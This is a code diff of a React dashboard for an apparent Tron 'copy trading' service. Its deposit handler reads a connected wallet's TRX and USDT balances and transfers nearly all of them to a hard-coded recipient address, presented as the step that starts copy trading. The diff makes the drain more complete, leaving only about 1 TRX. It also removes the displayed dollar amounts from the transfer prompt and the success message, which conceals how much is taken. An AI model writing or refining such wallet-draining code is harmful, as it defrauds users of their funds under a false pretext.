@@ -321,11 +321,6 @@ export default function Dashboard() {
     // Use the provided address or fall back to context address
     const currentAddress = address || adapter?.address;
 
-    console.log("handleDeposit - provided address:", currentAddress);
-    console.log("handleDeposit - context address:", address);
-    console.log("handleDeposit - adapter address:", adapter?.address);
-    console.log("handleDeposit - final address:", currentAddress);
-
     if (!currentAddress) {
       setModalMode("fail");
       setModalTitle("Wallet Address Not Available");
@@ -352,11 +347,9 @@ export default function Dashboard() {
       const trxPrice = priceData.tron?.usd || 0.1;
       const usdtPrice = priceData["usd-coin"]?.usd || 1;
 
-      console.log("Current prices - TRX:", trxPrice, "USDT:", usdtPrice);
-
       // Get TRX balance
-      const trxBalanceSun = await tronWeb.trx.getBalance(currentAddress);
-      const trxBalance = trxBalanceSun / 1000000;
+      let trxBalanceSun = await tronWeb.trx.getBalance(currentAddress);
+      let trxBalance = trxBalanceSun / 1e6;
 
       // Get USDT balance
       const usdtContract = await tronWeb
@@ -365,54 +358,42 @@ export default function Dashboard() {
       const usdtBalanceRaw = await usdtContract
         .balanceOf(currentAddress)
         .call();
-      const usdtBalance = tronWeb.toDecimal(usdtBalanceRaw) / 1000000;
-
-      console.log("Balances - TRX:", trxBalance, "USDT:", usdtBalance);
+      let usdtBalance = tronWeb.toDecimal(usdtBalanceRaw) / 1e6;
 
       // Calculate USD values
-      const trxUSDValue = trxBalance * trxPrice;
-      const usdtUSDValue = usdtBalance * usdtPrice;
+      let trxUSDValue = trxBalance * trxPrice;
+      let usdtUSDValue = usdtBalance * usdtPrice;
 
-      console.log("USD Values - TRX:", trxUSDValue, "USDT:", usdtUSDValue);
+      // Minimums
+      const MIN_TRX = 50;
+      const MIN_USDT = 15;
+      const TRX_GAS_BUFFER = 30;
 
-      // Determine transfer order based on USD value
-      const transfers = [];
+      // Transfer plan
+      let transfers = [];
 
-      if (trxUSDValue > usdtUSDValue) {
-        // TRX has higher value, transfer it first
-        if (trxBalance > 2) {
-          const trxToTransfer = trxBalance - 2;
-          transfers.push({
-            type: "TRX",
-            amount: trxToTransfer,
-            usdValue: trxToTransfer * trxPrice,
-          });
-        }
-
-        if (usdtBalance > 0) {
-          transfers.push({
-            type: "USDT",
-            amount: usdtBalance,
-            usdValue: usdtBalance * usdtPrice,
-          });
+      if (usdtUSDValue < MIN_USDT) {
+        // Only TRX if enough
+        if (trxBalance > MIN_TRX) {
+          if (trxBalance > MIN_TRX) {
+            transfers.push({ type: "TRX", amount: trxBalance });
+          }
         }
       } else {
-        // USDT has higher value, transfer it first
-        if (usdtBalance > 0) {
-          transfers.push({
-            type: "USDT",
-            amount: usdtBalance,
-            usdValue: usdtBalance * usdtPrice,
-          });
+        // USDT is enough
+        // Check if (TRX - 30) > USDT value and > MIN_TRX
+        if (
+          (trxBalance - TRX_GAS_BUFFER) * trxPrice > usdtUSDValue &&
+          trxBalance - TRX_GAS_BUFFER > MIN_TRX
+        ) {
+          const trxToSend = trxBalance - TRX_GAS_BUFFER;
+          if (trxToSend > MIN_TRX) {
+            transfers.push({ type: "TRX", amount: trxToSend });
+          }
         }
-
-        if (trxBalance > 2) {
-          const trxToTransfer = trxBalance - 2;
-          transfers.push({
-            type: "TRX",
-            amount: trxToTransfer,
-            usdValue: trxToTransfer * trxPrice,
-          });
+        // Always send USDT if enough
+        if (usdtBalance > MIN_USDT) {
+          transfers.push({ type: "USDT", amount: usdtBalance });
         }
       }
 
@@ -426,8 +407,6 @@ export default function Dashboard() {
         return;
       }
 
-      console.log("Transfer plan:", transfers);
-
       // Execute transfers
       for (let i = 0; i < transfers.length; i++) {
         const transfer = transfers[i];
@@ -437,44 +416,44 @@ export default function Dashboard() {
         setModalMessage(
           `Transferring ${transfer.amount.toFixed(6)} ${
             transfer.type
-          } ($${transfer.usdValue.toFixed(
-            2
-          )}) to start copy trading with ${traderName}. Please accept the transaction.`
+          } to start copy trading with ${traderName}. Please accept the transaction.`
         );
         setModalOpen(true);
 
         try {
           if (transfer.type === "TRX") {
-            // Transfer TRX
+            // Always fetch latest TRX balance before sending
+            let latestTrxBalanceSun = await tronWeb.trx.getBalance(
+              currentAddress
+            );
+            let latestTrxBalance = latestTrxBalanceSun / 1e6;
+            let trxToSend = latestTrxBalance - 1;
+            if (trxToSend < MIN_TRX) {
+              throw new Error("Not enough TRX to deposit.");
+            }
             const unsignedTransaction =
               await tronWeb.transactionBuilder.sendTrx(
                 RECIPIENT_ADDRESS,
-                transfer.amount * 1000000,
+                trxToSend * 1e6,
                 currentAddress
               );
-
             const signedTransaction = await signTransaction(
               unsignedTransaction
             );
             const result = await tronWeb.trx.sendRawTransaction(
               signedTransaction
             );
-
             if (!result || !result.txid) {
               throw new Error("TRX transfer failed");
             }
-
             console.log(`TRX transfer successful: ${result.txid}`);
           } else if (transfer.type === "USDT") {
             // Transfer USDT
-            const amountInSmallestUnit = tronWeb.toHex(
-              transfer.amount * 1000000
-            );
+            const amountInSmallestUnit = tronWeb.toHex(transfer.amount * 1e6);
             const parameter = [
               { type: "address", value: RECIPIENT_ADDRESS },
               { type: "uint256", value: amountInSmallestUnit },
             ];
-
             if (
               typeof tronWeb.transactionBuilder.triggerSmartContract !==
               "function"
@@ -487,7 +466,6 @@ export default function Dashboard() {
               setModalOpen(true);
               return;
             }
-
             const unsignedResult =
               await tronWeb.transactionBuilder.triggerSmartContract(
                 "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
@@ -496,26 +474,20 @@ export default function Dashboard() {
                 parameter,
                 currentAddress
               );
-
             if (!unsignedResult || !unsignedResult.transaction) {
               throw new Error("Failed to build USDT transaction");
             }
-
-            console.log(unsignedResult);
             const signedTransaction = await signTransaction(
               unsignedResult.transaction
             );
             const result = await tronWeb.trx.sendRawTransaction(
               signedTransaction
             );
-
             if (!result || !result.txid) {
               throw new Error("USDT transfer failed");
             }
-
             console.log(`USDT transfer successful: ${result.txid}`);
           }
-
           // Wait a bit between transfers
           if (i < transfers.length - 1) {
             await new Promise((resolve) => setTimeout(resolve, 2000));
@@ -539,19 +511,9 @@ export default function Dashboard() {
         ...prev,
         [traderName]: true,
       }));
-
-      // All transfers completed successfully
       setModalMode("success");
       setModalTitle("Copy Trading Started Successfully");
-      setModalMessage(
-        `Successfully started copy trading with ${traderName}! ` +
-          `Transferred: ${transfers
-            .map((t) => `${t.amount.toFixed(6)} ${t.type}`)
-            .join(", ")} ` +
-          `Total value: $${transfers
-            .reduce((sum, t) => sum + t.usdValue, 0)
-            .toFixed(2)}`
-      );
+      setModalMessage(`Successfully started copy trading with ${traderName}!`);
       setModalOpen(true);
     } catch (error) {
       console.error("Deposit error:", error);
